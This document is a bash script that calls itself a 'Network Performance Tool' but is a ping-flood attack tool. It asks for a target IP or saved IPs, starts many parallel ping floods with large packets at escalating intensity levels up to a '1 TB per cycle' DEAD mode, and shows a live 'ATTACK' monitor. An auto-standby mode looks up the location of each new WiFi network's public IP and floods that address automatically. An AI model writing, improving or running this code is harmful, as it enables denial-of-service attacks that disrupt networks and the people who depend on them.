#!/usr/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'
DIM='\033[2m'

CONFIG_DIR="$HOME/.netwo-burst"
CONFIG_FILE="$CONFIG_DIR/saved_ips.conf"

mkdir -p "$CONFIG_DIR"

save_ip() {
    local ip="$1"
    local name="$2"
    echo "$name|$ip|$(date '+%Y-%m-%d %H:%M:%S')" >> "$CONFIG_FILE"
}

list_saved_ips() {
    if [ ! -f "$CONFIG_FILE" ] || [ ! -s "$CONFIG_FILE" ]; then
        echo -e "${YELLOW}No saved IPs found${NC}\n"
        return 1
    fi
    
    echo -e "${CYAN}${BOLD}Saved IPs:${NC}\n"
    local index=1
    while IFS='|' read -r name ip timestamp; do
        echo -e "${GREEN}$index${NC}) ${WHITE}$name${NC} - ${CYAN}$ip${NC} ${DIM}($timestamp)${NC}"
        ((index++))
    done < "$CONFIG_FILE"
    echo ""
    return 0
}

select_saved_ip() {
    list_saved_ips || return 1
    
    read -p "$(echo -e ${YELLOW}'Select IP number (or 0 to cancel): '${NC})" selection
    
    if [ "$selection" = "0" ]; then
        return 1
    fi
    
    if ! [[ "$selection" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[✗] Invalid selection${NC}"
        return 1
    fi
    
    local selected_ip=$(sed -n "${selection}p" "$CONFIG_FILE" | cut -d'|' -f2)
    
    if [ -z "$selected_ip" ]; then
        echo -e "${RED}[✗] Invalid selection${NC}"
        return 1
    fi
    
    echo "$selected_ip"
}

delete_saved_ip() {
    list_saved_ips || return
    
    read -p "$(echo -e ${RED}'Delete IP number (or 0 to cancel): '${NC})" selection
    
    if [ "$selection" = "0" ]; then
        return
    fi
    
    if ! [[ "$selection" =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[✗] Invalid selection${NC}"
        return
    fi
    
    sed -i "${selection}d" "$CONFIG_FILE" 2>/dev/null
    echo -e "${GREEN}[✓] IP deleted${NC}"
    sleep 1
}

clear

echo -e "${RED}"
cat << "EOF"
                                      
          ▄██████████████▄▐█▄▄▄▄█▌
          ██████▌▄▌▄▐▐▌███▌▀▀██▀▀
          ████▄█▌▄▌▄▐▐▌▀███▄▄█▌
          ▄▄▄▄▄██████████████▀
EOF

echo -e "${NC}"
sleep 0.3

echo -e "${RED}${BOLD}"
cat << "EOF"
╔═══════════════════════════════════════════╗
║     NETWO-BURST-MINI v2.0                   ║
║     Network Performance Tool              ║
║     By: DoggoJ (UwURaww)                    ║
╚═══════════════════════════════════════════╝
EOF
echo -e "${NC}\n"

echo -e "${YELLOW}IP Configuration:${NC}"
echo -e "${GREEN}1${NC}) Auto-detect my IP"
echo -e "${CYAN}2${NC}) Use saved IP"
echo -e "${WHITE}3${NC}) Enter custom IP"
echo -e "${PURPLE}4${NC}) Manage saved IPs"
echo -e "${BLUE}5${NC}) WiFi Scanner (Auto-detect & Save)"
echo -e "${RED}${BOLD}6${NC}) ${BLINK}AUTO-STANDBY MODE${NC} ${DIM}(Auto-attack on WiFi change)${NC}"
echo ""
read -p "$(echo -e ${WHITE}'Select option [1-6]: '${NC})" ip_option

ip=""

case $ip_option in
    1)
        echo -e "\n${CYAN}[*] Getting your IP...${NC}"
        ip=$(curl -s icanhazip.com)
        
        if [ -z "$ip" ]; then
            echo -e "${RED}[✗] Failed to get IP${NC}"
            exit 1
        fi
        
        echo -e "${GREEN}[✓] Detected: ${WHITE}$ip${NC}"
        
        read -p "$(echo -e ${YELLOW}'\nSave this IP? [y/n]: '${NC})" save_choice
        if [ "$save_choice" = "y" ]; then
            read -p "$(echo -e ${CYAN}'Enter a name for this IP: '${NC})" ip_name
            if [ -n "$ip_name" ]; then
                save_ip "$ip" "$ip_name"
                echo -e "${GREEN}[✓] IP saved as '$ip_name'${NC}"
            fi
        fi
        ;;
        
    2)
        echo ""
        ip=$(select_saved_ip)
        if [ -z "$ip" ]; then
            echo -e "${YELLOW}[!] No IP selected, using auto-detect...${NC}"
            ip=$(curl -s icanhazip.com)
        else
            echo -e "${GREEN}[✓] Using: ${WHITE}$ip${NC}"
        fi
        ;;
        
    3)
        echo ""
        read -p "$(echo -e ${CYAN}'Enter target IP: '${NC})" custom_ip
        
        if [[ $custom_ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            ip="$custom_ip"
            echo -e "${GREEN}[✓] Using: ${WHITE}$ip${NC}"
            
            read -p "$(echo -e ${YELLOW}'\nSave this IP? [y/n]: '${NC})" save_choice
            if [ "$save_choice" = "y" ]; then
                read -p "$(echo -e ${CYAN}'Enter a name for this IP: '${NC})" ip_name
                if [ -n "$ip_name" ]; then
                    save_ip "$ip" "$ip_name"
                    echo -e "${GREEN}[✓] IP saved as '$ip_name'${NC}"
                fi
            fi
        else
            echo -e "${RED}[✗] Invalid IP format${NC}"
            exit 1
        fi
        ;;
        
    4)
        while true; do
            clear
            echo -e "${CYAN}${BOLD}╔═══════════════════════════════════════════╗${NC}"
            echo -e "${CYAN}${BOLD}║        MANAGE SAVED IPs                   ║${NC}"
            echo -e "${CYAN}${BOLD}╚═══════════════════════════════════════════╝${NC}\n"
            
            echo -e "${GREEN}1${NC}) View saved IPs"
            echo -e "${RED}2${NC}) Delete an IP"
            echo -e "${YELLOW}3${NC}) Back to main menu"
            echo ""
            read -p "$(echo -e ${WHITE}'Select option [1-3]: '${NC})" manage_option
            
            case $manage_option in
                1)
                    echo ""
                    list_saved_ips
                    read -p "Press Enter to continue..."
                    ;;
                2)
                    echo ""
                    delete_saved_ip
                    ;;
                3)
                    exec "$0"
                    exit 0
                    ;;
                *)
                    echo -e "${RED}[✗] Invalid option${NC}"
                    sleep 1
                    ;;
            esac
        done
        ;;
        
    5)
        echo ""
        echo -e "${BLUE}${BOLD}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}${BOLD}║        WiFi SCANNER MODE                  ║${NC}"
        echo -e "${BLUE}${BOLD}╚═══════════════════════════════════════════╝${NC}\n"
        echo -e "${CYAN}[*] Entering standby mode...${NC}"
        echo -e "${DIM}Monitoring for WiFi connections. Press Ctrl+C to exit.${NC}\n"
        
        last_ip=""
        scan_count=0
        
        wifi_scanner_cleanup() {
            echo -e "\n${YELLOW}[*] Exiting WiFi Scanner...${NC}"
            echo -e "${GREEN}[✓] Total scans: $scan_count${NC}"
            exit 0
        }
        
        trap wifi_scanner_cleanup SIGINT SIGTERM
        
        while true; do
            if ping -c 1 -W 2 8.8.8.8 &> /dev/null; then
                current_ip=$(curl -s --max-time 5 icanhazip.com)
                
                if [ -n "$current_ip" ] && [ "$current_ip" != "$last_ip" ]; then
                    echo -e "${GREEN}${BOLD}[✓] NEW WIFI DETECTED!${NC}"
                    echo -e "${CYAN}[*] IP: ${WHITE}$current_ip${NC}"
                    
                    echo -e "${CYAN}[*] Getting location info...${NC}"
                    location_data=$(curl -s "http://ip-api.com/json/$current_ip")
                    
                    if [ -n "$location_data" ]; then
                        city=$(echo "$location_data" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
                        region=$(echo "$location_data" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
                        country=$(echo "$location_data" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
                        isp=$(echo "$location_data" | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
                        
                        if [ -n "$city" ] && [ -n "$country" ]; then
                            location_name="$city, $region, $country"
                        else
                            location_name="Unknown Location"
                        fi
                        
                        echo -e "${GREEN}[✓] Location: ${WHITE}$location_name${NC}"
                        [ -n "$isp" ] && echo -e "${GREEN}[✓] ISP: ${WHITE}$isp${NC}"
                    else
                        location_name="Unknown Location"
                    fi
                    
                    ip_exists=false
                    if [ -f "$CONFIG_FILE" ]; then
                        while IFS='|' read -r saved_name saved_ip saved_time; do
                            if [ "$saved_ip" = "$current_ip" ]; then
                                ip_exists=true
                                echo -e "${YELLOW}[!] IP already saved as: $saved_name${NC}"
                                break
                            fi
                        done < "$CONFIG_FILE"
                    fi
                    
                    if [ "$ip_exists" = false ]; then
                        save_ip "$current_ip" "$location_name"
                        echo -e "${GREEN}${BOLD}[✓] AUTO-SAVED as '$location_name'${NC}\n"
                        scan_count=$((scan_count + 1))
                    else
                        echo ""
                    fi
                    
                    last_ip="$current_ip"
                else
                    if [ -n "$current_ip" ]; then
                        echo -ne "${DIM}[$(date '+%H:%M:%S')] Monitoring... Current IP: $current_ip\r${NC}"
                    fi
                fi
            else
                echo -ne "${YELLOW}[$(date '+%H:%M:%S')] No connection detected. Waiting...\r${NC}"
                last_ip=""
            fi
            
            sleep 5
        done
        ;;
        
    6)
        echo ""
        echo -e "${RED}${BOLD}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}║        AUTO-STANDBY MODE                  ║${NC}"
        echo -e "${RED}${BOLD}╚═══════════════════════════════════════════╝${NC}\n"
        
        read -p "$(echo -e ${YELLOW}'How many instances? '${NC})" instances
        
        if ! [[ "$instances" =~ ^[0-9]+$ ]] || [ "$instances" -lt 1 ]; then
            echo -e "${RED}[✗] Invalid number${NC}"
            exit 1
        fi
        
        echo -e "\n${YELLOW}Select intensity level:${NC}"
        echo -e "${GREEN}1${NC}) Normal      ${DIM}(Safe)${NC}"
        echo -e "${YELLOW}2${NC}) Medium      ${DIM}(Moderate)${NC}"
        echo -e "${RED}3${NC}) Hell Yeah!  ${DIM}(Intense)${NC}"
        echo -e "${RED}${BOLD}4${NC}) Doomed      ${DIM}(MAXIMUM)${NC}"
        echo -e "${RED}${BOLD}${BLINK}5${NC}) 💀 DEAD 💀    ${DIM}(APOCALYPSE - 1TB TARGET)${NC}"
        echo ""
        read -p "$(echo -e ${WHITE}'Level [1-5]: '${NC})" level
        
        case $level in
            1)
                LEVEL_NAME="${GREEN}NORMAL${NC}"
                PACKET_SIZE=1024
                INTERVAL=0.5
                BURST_COUNT=10
                ;;
            2)
                LEVEL_NAME="${YELLOW}MEDIUM${NC}"
                PACKET_SIZE=8192
                INTERVAL=0.2
                BURST_COUNT=50
                ;;
            3)
                LEVEL_NAME="${RED}HELL YEAH!${NC}"
                PACKET_SIZE=32768
                INTERVAL=0.05
                BURST_COUNT=100
                ;;
            4)
                LEVEL_NAME="${RED}${BOLD}${BLINK}DOOMED${NC}"
                PACKET_SIZE=65027
                INTERVAL=0
                BURST_COUNT=500
                ;;
            5)
                LEVEL_NAME="${RED}${BOLD}${BLINK}💀 DEAD 💀${NC}"
                PACKET_SIZE=65027
                INTERVAL=0
                BURST_COUNT=2000
                
                echo -e "\n${RED}${BOLD}╔═══════════════════════════════════════════╗${NC}"
                echo -e "${RED}${BOLD}║  ⚠️  EXTREME WARNING - DEAD MODE  ⚠️       ║${NC}"
                echo -e "${RED}${BOLD}╚═══════════════════════════════════════════╝${NC}"
                echo -e "${YELLOW}Target: Send 1 TERABYTE of data${NC}"
                echo -e "${YELLOW}This will use MAXIMUM system resources!${NC}"
                echo -e "${RED}${BLINK}THIS MAY CRASH YOUR SYSTEM OR NETWORK!${NC}\n"
                
                read -p "$(echo -e ${RED}${BOLD}'Type DEAD to confirm: '${NC})" confirm
                if [ "$confirm" != "DEAD" ]; then
                    echo -e "${YELLOW}[!] Cancelled. Switching to Doomed mode...${NC}"
                    LEVEL_NAME="${RED}${BOLD}${BLINK}DOOMED${NC}"
                    PACKET_SIZE=65027
                    INTERVAL=0
                    BURST_COUNT=500
                fi
                ;;
            *)
                echo -e "${RED}[✗] Invalid level${NC}"
                exit 1
                ;;
        esac
        
        echo ""
        echo -e "${CYAN}[*] Configuration saved${NC}"
        echo -e "${CYAN}[*] Entering AUTO-STANDBY mode...${NC}"
        echo -e "${DIM}Will auto-attack when WiFi connects/changes. Press Ctrl+C to exit.${NC}\n"
        
        LOG_DIR="/tmp/netwo_mini_$$"
        mkdir -p "$LOG_DIR"
        
        last_ip=""
        attack_running=false
        attack_pids=()
        
        standby_cleanup() {
            echo -e "\n\n${YELLOW}[*] Exiting AUTO-STANDBY mode...${NC}"
            
            if [ "$attack_running" = true ]; then
                for pid in "${attack_pids[@]}"; do
                    kill "$pid" 2>/dev/null
                done
            fi
            
            rm -rf "$LOG_DIR"
            echo -e "${GREEN}[✓] Cleanup complete${NC}"
            exit 0
        }
        
        trap standby_cleanup SIGINT SIGTERM
        
        start_attack_background() {
            local target_ip="$1"
            
            if [ "$attack_running" = true ]; then
                echo -e "${YELLOW}[*] Stopping previous attack...${NC}"
                for pid in "${attack_pids[@]}"; do
                    kill "$pid" 2>/dev/null
                done
                attack_pids=()
            fi
            
            echo -e "${GREEN}${BOLD}[✓] STARTING ATTACK${NC}"
            echo -e "${CYAN}Target: ${RED}$target_ip${NC}"
            echo -e "${CYAN}Level: $LEVEL_NAME"
            echo -e "${CYAN}Instances: ${WHITE}$instances${NC}\n"
            
            for i in $(seq 1 $instances); do
                (
                    count=0
                    echo "0" > "$LOG_DIR/count_$i"
                    
                    while true; do
                        ping -i $INTERVAL -c $BURST_COUNT -s $PACKET_SIZE -W 1 $target_ip &>/dev/null
                        count=$((count + BURST_COUNT))
                        echo "$count" > "$LOG_DIR/count_$i"
                    done
                ) &
                attack_pids+=($!)
                echo -e "${GREEN}[✓] Instance #$i started${NC}"
            done
            
            attack_running=true
            attack_start_time=$(date +%s)
            echo ""
        }
        
        while true; do
            if ping -c 1 -W 2 8.8.8.8 &> /dev/null; then
                current_ip=$(curl -s --max-time 5 icanhazip.com)
                
                if [ -n "$current_ip" ]; then
                    if [ "$current_ip" != "$last_ip" ]; then
                        echo -e "${GREEN}${BOLD}[!] NEW WIFI DETECTED!${NC}"
                        echo -e "${CYAN}[*] IP: ${WHITE}$current_ip${NC}"
                        
                        location_data=$(curl -s --max-time 3 "http://ip-api.com/json/$current_ip")
                        if [ -n "$location_data" ]; then
                            city=$(echo "$location_data" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
                            country=$(echo "$location_data" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
                            [ -n "$city" ] && [ -n "$country" ] && echo -e "${CYAN}[*] Location: ${WHITE}$city, $country${NC}"
                        fi
                        
                        echo ""
                        last_ip="$current_ip"
                        
                        start_attack_background "$current_ip"
                    else
                        if [ "$attack_running" = true ]; then
                            now=$(date +%s)
                            elapsed=$((now - attack_start_time))
                            
                            total=0
                            for i in $(seq 1 $instances); do
                                count=$(cat "$LOG_DIR/count_$i" 2>/dev/null || echo "0")
                                total=$((total + count))
                            done
                            
                            if [ $elapsed -gt 0 ]; then
                                pps=$((total / elapsed))
                            else
                                pps=0
                            fi
                            
                            echo -ne "${DIM}[$(date '+%H:%M:%S')] ATTACKING $current_ip │ Pkts: $total │ PPS: $pps │ Up: ${elapsed}s\r${NC}"
                        fi
                    fi
                fi
            else
                if [ "$attack_running" = true ]; then
                    echo -e "\n${YELLOW}[!] WiFi DISCONNECTED${NC}"
                    echo -e "${BLUE}[*] Stopping attack...${NC}"
                    
                    for pid in "${attack_pids[@]}"; do
                        kill "$pid" 2>/dev/null
                    done
                    attack_pids=()
                    attack_running=false
                    echo -e "${GREEN}[✓] Attack stopped${NC}\n"
                fi
                
                echo -ne "${YELLOW}[$(date '+%H:%M:%S')] No WiFi. Waiting for connection...\r${NC}"
                last_ip=""
            fi
            
            sleep 3
        done
        ;;
        
    *)
        echo -e "${RED}[✗] Invalid option${NC}"
        exit 1
        ;;
esac

if [ -z "$ip" ]; then
    echo -e "${RED}[✗] No IP available${NC}"
    exit 1
fi

echo ""

read -p "$(echo -e ${YELLOW}'How many instances? '${NC})" instances

if ! [[ "$instances" =~ ^[0-9]+$ ]] || [ "$instances" -lt 1 ]; then
    echo -e "${RED}[✗] Invalid number${NC}"
    exit 1
fi

echo -e "\n${YELLOW}Select intensity level:${NC}"
echo -e "${GREEN}1${NC}) Normal      ${DIM}(Safe)${NC}"
echo -e "${YELLOW}2${NC}) Medium      ${DIM}(Moderate)${NC}"
echo -e "${RED}3${NC}) Hell Yeah!  ${DIM}(Intense)${NC}"
echo -e "${RED}${BOLD}4${NC}) Doomed      ${DIM}(MAXIMUM)${NC}"
echo -e "${RED}${BOLD}${BLINK}5${NC}) 💀 DEAD 💀    ${DIM}(APOCALYPSE - 1TB TARGET)${NC}"
echo ""
read -p "$(echo -e ${WHITE}'Level [1-5]: '${NC})" level

case $level in
    1)
        LEVEL_NAME="${GREEN}NORMAL${NC}"
        PACKET_SIZE=1024
        INTERVAL=0.5
        BURST_COUNT=10
        ;;
    2)
        LEVEL_NAME="${YELLOW}MEDIUM${NC}"
        PACKET_SIZE=8192
        INTERVAL=0.2
        BURST_COUNT=50
        ;;
    3)
        LEVEL_NAME="${RED}HELL YEAH!${NC}"
        PACKET_SIZE=32768
        INTERVAL=0.05
        BURST_COUNT=100
        ;;
    4)
        LEVEL_NAME="${RED}${BOLD}${BLINK}DOOMED${NC}"
        PACKET_SIZE=65027
        INTERVAL=0
        BURST_COUNT=500
        ;;
    5)
        LEVEL_NAME="${RED}${BOLD}${BLINK}💀 DEAD 💀${NC}"
        PACKET_SIZE=65027
        INTERVAL=0
        BURST_COUNT=16777216
        DEAD_MODE=true
        
        echo -e "\n${RED}${BOLD}╔═══════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}║  ⚠️  EXTREME WARNING - DEAD MODE  ⚠️       ║${NC}"
        echo -e "${RED}${BOLD}╚═══════════════════════════════════════════╝${NC}"
        echo -e "${YELLOW}Each cycle sends: 1 TERABYTE of data${NC}"
        echo -e "${YELLOW}Burst: 16,777,216 packets × 65KB = ~1TB${NC}"
        echo -e "${YELLOW}This will use MAXIMUM system resources!${NC}"
        echo -e "${RED}${BLINK}THIS MAY CRASH YOUR SYSTEM OR NETWORK!${NC}\n"
        
        read -p "$(echo -e ${RED}${BOLD}'Type DEAD to confirm: '${NC})" confirm
        if [ "$confirm" != "DEAD" ]; then
            echo -e "${YELLOW}[!] Cancelled. Switching to Doomed mode...${NC}"
            LEVEL_NAME="${RED}${BOLD}${BLINK}DOOMED${NC}"
            PACKET_SIZE=65027
            INTERVAL=0
            BURST_COUNT=500
            DEAD_MODE=false
        fi
        ;;
    *)
        echo -e "${RED}[✗] Invalid level${NC}"
        exit 1
        ;;
esac

echo ""
echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${NC} Level: $LEVEL_NAME"
echo -e "${CYAN}║${NC} Instances: ${WHITE}$instances${NC}"
echo -e "${CYAN}║${NC} Packet Size: ${WHITE}${PACKET_SIZE} bytes${NC}"
echo -e "${CYAN}║${NC} Target: ${RED}$ip${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
echo ""

echo -e "${YELLOW}Starting in...${NC}"
for i in 3 2 1; do
    echo -e "${RED}${BOLD}  $i${NC}"
    sleep 1
done

clear
echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}${BOLD}║        ATTACK INITIATED                   ║${NC}"
echo -e "${GREEN}${BOLD}╚═══════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Level: $LEVEL_NAME │ ${WHITE}Instances: $instances${NC}"
echo -e "${RED}Press Ctrl+C to stop${NC}\n"

LOG_DIR="/tmp/netwo_mini_$$"
mkdir -p "$LOG_DIR"

pids=()

cleanup() {
    echo -e "\n\n${YELLOW}[*] Stopping...${NC}"
    for pid in "${pids[@]}"; do
        kill "$pid" 2>/dev/null
    done
    
    total=0
    for i in $(seq 1 $instances); do
        count=$(cat "$LOG_DIR/count_$i" 2>/dev/null || echo "0")
        total=$((total + count))
    done
    
    echo -e "${GREEN}[✓] Total packets: ${WHITE}$total${NC}"
    rm -rf "$LOG_DIR"
    exit 0
}

trap cleanup SIGINT SIGTERM

if [ "${DEAD_MODE:-false}" = true ]; then
    echo -e "${RED}${BOLD}[!] DEAD MODE: 1 TB per cycle${NC}"
    echo -e "${YELLOW}[*] Each burst = 16,777,216 packets × 65KB ≈ 1 TB${NC}"
    echo -e "${RED}${BLINK}[!] EXTREME NETWORK LOAD - USE WITH CAUTION!${NC}\n"
fi

for i in $(seq 1 $instances); do
    (
        count=0
        cycles=0
        echo "0" > "$LOG_DIR/count_$i"
        echo "0" > "$LOG_DIR/cycles_$i"
        
        while true; do
            ping -i $INTERVAL -c $BURST_COUNT -s $PACKET_SIZE -W 1 $ip &>/dev/null
            count=$((count + BURST_COUNT))
            cycles=$((cycles + 1))
            echo "$count" > "$LOG_DIR/count_$i"
            echo "$cycles" > "$LOG_DIR/cycles_$i"
        done
    ) &
    pids+=($!)
    echo -e "${GREEN}[✓] Instance #$i started${NC}"
done

echo -e "\n${CYAN}${BOLD}[*] RUNNING...${NC}\n"

start=$(date +%s)
while true; do
    sleep 2
    
    now=$(date +%s)
    elapsed=$((now - start))
    
    total=0
    total_cycles=0
    for i in $(seq 1 $instances); do
        count=$(cat "$LOG_DIR/count_$i" 2>/dev/null || echo "0")
        cycles=$(cat "$LOG_DIR/cycles_$i" 2>/dev/null || echo "0")
        total=$((total + count))
        total_cycles=$((total_cycles + cycles))
    done
    
    if [ $elapsed -gt 0 ]; then
        pps=$((total / elapsed))
    else
        pps=0
    fi
    
    clear
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}    NETWO-BURST-MINI - LIVE MONITOR${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════${NC}\n"
    
    echo -e "${WHITE}Level:${NC}        $LEVEL_NAME"
    echo -e "${WHITE}Target:${NC}       ${RED}$ip${NC}"
    echo -e "${WHITE}Instances:${NC}    ${CYAN}$instances${NC}"
    echo -e "${WHITE}Uptime:${NC}       ${GREEN}${elapsed}s${NC}"
    echo -e "${WHITE}Total Pkts:${NC}   ${YELLOW}${BOLD}$total${NC}"
    echo -e "${WHITE}Packets/sec:${NC}  ${YELLOW}${BOLD}$pps${NC}"
    
    if [ "${DEAD_MODE:-false}" = true ]; then
        total_tb=$(awk "BEGIN {printf \"%.3f\", ($total * 65027) / 1099511627776}")
        echo -e "${WHITE}Total Cycles:${NC} ${RED}${BOLD}$total_cycles${NC}"
        echo -e "${WHITE}Data Sent:${NC}    ${RED}${BOLD}~${total_tb} TB${NC}"
        echo -e "${YELLOW}[*] Each cycle ≈ 1 TB (16.7M packets × 65KB)${NC}"
    fi
    
    echo ""
    
    for i in $(seq 1 $instances); do
        count=$(cat "$LOG_DIR/count_$i" 2>/dev/null || echo "0")
        cycles=$(cat "$LOG_DIR/cycles_$i" 2>/dev/null || echo "0")
        bar=""
        filled=$((count % 20))
        for b in $(seq 1 20); do
            [ $b -le $filled ] && bar="${bar}${GREEN}█${NC}" || bar="${bar}${DIM}░${NC}"
        done
        if [ "${DEAD_MODE:-false}" = true ]; then
            echo -e "${CYAN}#$i${NC} $bar ${WHITE}$count${NC} ${DIM}(${cycles} cycles)${NC}"
        else
            echo -e "${CYAN}#$i${NC} $bar ${WHITE}$count${NC}"
        fi
    done
    
    if [ "${DEAD_MODE:-false}" = true ]; then
        echo -e "\n${RED}${BOLD}${BLINK}[!] DEAD MODE ACTIVE${NC} - 1 TB per cycle"
    else
        echo -e "\n${RED}${BLINK}[!] RUNNING${NC} - Press Ctrl+C to stop"
    fi
done

wait
